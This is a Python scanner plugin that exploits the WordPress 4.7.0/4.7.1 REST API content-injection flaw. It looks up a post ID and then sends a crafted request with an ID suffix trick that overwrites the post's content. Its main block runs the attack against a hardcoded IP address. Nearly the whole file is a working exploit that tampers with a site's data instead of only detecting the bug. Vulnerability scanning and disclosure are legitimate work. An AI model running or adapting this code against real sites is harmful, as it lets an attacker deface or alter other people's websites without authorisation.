#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author: Fleey
# ref: http://43.248.187.89:8000/wp-json/wp/v2/posts/1/?id=1abc
# title: WordPress 4.7.0/4.7.1 REST API 内容注入漏洞
import json
from urllib import parse


def assign(service_list):
    if 'wordpress' in service_list:
        return True
    return False


def get_first_posts(target_url, user_agent, cookie):
    request_path = parse.urljoin(target_url, '/wp-json/wp/v2/posts')
    code, head, res, error_code, _ = curl(request_path, headers={
        'User-Agent': user_agent,
        'Cookie': cookie
    })
    if code != 200:
        return 0

    res = json.loads(res)
    if len(res) == 0:
        return 0
    return res[0]['id']


def test_attack(target_url, user_agent, cookie, posts_id):
    request_path = parse.urljoin(target_url,
                                 '/wp-json/wp/v2/posts/' + str(posts_id) + '/?id=' + str(posts_id) + 'test_content')
    code, head, res, error_code, _ = curl(request_path, headers={
        'User-Agent': user_agent,
        'Cookie': cookie
    }, request_type='json', request_data=json.dumps({
        'content': 'test_content'
    }))
    return code == 200


def audit(target_url, user_agent, cookie):
    posts_id = get_first_posts(target_url, '', '')
    if posts_id == 0:
        send_scan_result('WordPress 4.7.0/4.7.1 REST API 内容注入漏洞', '疑似存在漏洞 但是没有找到更多文章', 1)
        return
    if test_attack(target_url, user_agent, cookie, posts_id):
        send_scan_result('WordPress 4.7.0/4.7.1 REST API 内容注入漏洞',
                         '存在漏洞，能够修改文章内容\r\n https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/', 3)


if __name__ == '__main__':
    def send_scan_result(title, body, level):
        print('[+][' + str(level) + ']' + '[' + title + ']' + body)

    from tootls import curl2 as curl
    audit('http://43.248.187.89:8000', 'none', 'cookie')
